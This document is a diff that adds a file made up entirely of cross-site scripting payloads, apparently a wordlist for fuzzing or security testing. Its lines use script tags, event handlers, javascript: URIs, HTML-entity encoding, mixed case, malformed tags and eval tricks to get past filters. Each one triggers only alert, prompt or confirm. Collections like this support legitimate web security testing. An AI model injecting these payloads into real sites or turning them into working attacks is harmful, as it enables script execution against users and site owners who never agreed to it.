@@ -1,0 +1,24 @@
+<img onerror="alert(document.domain);" src=>
+ceshi2</span><img src='' onerror=alert(1)>
+<script x> alert(1) </script 1=2
+<div/onmouseover='alert(1)'> style="x:">
+<svg><script ?>alert(1)
+<svg/onload=alert(1)
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<SCRIPT>alert('XSS');</SCRIPT>
+<script>alert(1);</script>
+<script>prompt(1);</script>
+<script>confirm(1);</script>
+<scRiPt>alert(1);</scrIPt>
+<svg/onload=prompt(1);>
+<marquee/onstart=confirm(2)>/
+<body onload=prompt(1);>
+<img src=x onerror="javascript:window.onerror=alert;throw 1">
+<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';>
+<img style="xss:expression(alert(0))"> 
+<svg><script>alert&#40/1/&#41</script> 
+<svg><script>alert&#40 1&#41
+
